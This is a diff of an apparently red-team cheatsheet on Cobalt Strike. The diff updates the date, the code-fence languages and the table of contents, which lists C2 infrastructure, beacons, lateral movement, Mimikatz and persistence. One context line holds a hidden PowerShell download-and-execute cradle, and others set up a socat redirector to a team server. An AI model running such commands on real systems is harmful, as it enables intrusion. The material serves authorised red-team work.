@@ -1,6 +1,6 @@
 +++
 title = "Cobalt Strike"
-date = "2022-11-03"
+date = "2023-02-20"
 description = "Contains cheatsheet/quick reference materials but also dives deep into successfully using Cobalt Strike"
 include_toc = true
 show_comments = false
@@ -10,7 +10,7 @@ show_comments = false
 > Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
 
 
-```powershell
+```bash
 $ sudo apt-get update
 $ sudo apt-get install openjdk-11-jdk
 $ sudo apt install proxychains socat
@@ -22,41 +22,45 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
 
 ## Summary
 
-* [Infrastructure](#infrastructure)
-    * [Redirectors](#redirectors)
-    * [Domain fronting](#domain-fronting)
-* [OpSec](#opsec)
-    * [Customer ID](#customer-id)
-* [Payloads](#payloads)
-    * [DNS Beacon](#dns-beacon)
-    * [SMB Beacon](#smb-beacon)
-    * [Metasploit compatibility](#metasploit-compatibility)
-    * [Custom Payloads](#custom-payloads)
-* [Malleable C2](#malleable-c2)
-* [Files](#files)
-* [Powershell and .NET](#powershell-and-net)
-    * [Powershell commabds](#powershell-commands)
-    * [.NET remote execution](#net-remote-execution)
-* [Lateral Movement](#lateral-movement)
-* [VPN & Pivots](#vpn--pivots)
-* [Kits](#kits)
-    * [Elevate Kit](#elevate-kit)
-    * [Persistence Kit](#persistence-kit)
-    * [Resource Kit](#resource-kit)
-    * [Artifact Kit](#artifact-kit)
-    * [Mimikatz Kit](#mimikatz-kit)
-    * [Sleep Mask Kit](#sleep-mask-kit)
-    * [Thread Stack Spoofer](#thread-stack-spoofer)
-* [Beacon Object Files](#beacon-object-files)
-* [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
-* [References](#references)
+- [Cobalt Strike](#cobalt-strike)
+  - [Summary](#summary)
+  - [Infrastructure](#infrastructure)
+    - [Redirectors](#redirectors)
+    - [Domain Fronting](#domain-fronting)
+  - [OpSec](#opsec)
+    - [Customer ID](#customer-id)
+  - [Payloads](#payloads)
+    - [DNS Beacon](#dns-beacon)
+    - [SMB Beacon](#smb-beacon)
+    - [SSH Beacon](#ssh-beacon)
+    - [Metasploit compatibility](#metasploit-compatibility)
+    - [Custom Payloads](#custom-payloads)
+  - [Malleable C2](#malleable-c2)
+  - [Files](#files)
+  - [Powershell and .NET](#powershell-and-net)
+    - [Powershell commands](#powershell-commands)
+    - [.NET remote execution](#net-remote-execution)
+  - [Lateral Movement](#lateral-movement)
+    - [Assume Control of Artifact](#assume-control-of-artifact)
+  - [VPN \& Pivots](#vpn--pivots)
+  - [Kits](#kits)
+    - [Elevate Kit](#elevate-kit)
+    - [Persistence Kit](#persistence-kit)
+    - [Resource Kit](#resource-kit)
+    - [Artifact Kit](#artifact-kit)
+    - [Mimikatz Kit](#mimikatz-kit)
+    - [Sleep Mask Kit](#sleep-mask-kit)
+    - [Thread Stack Spoofer](#thread-stack-spoofer)
+  - [Beacon Object Files](#beacon-object-files)
+  - [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
+  - [References](#references)
 
 
 ## Infrastructure
 
 ### Redirectors
 
-```powershell
+```bash
 sudo apt install socat
 socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
 ```
@@ -111,7 +115,7 @@ NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
 A	campaigns.example.com           directs to 10.10.10.10	            3600 
 ```
 
-```powershell
+```bash
 systemctl disable systemd-resolved
 systemctl stop systemd-resolved
 rm /etc/resolv.conf
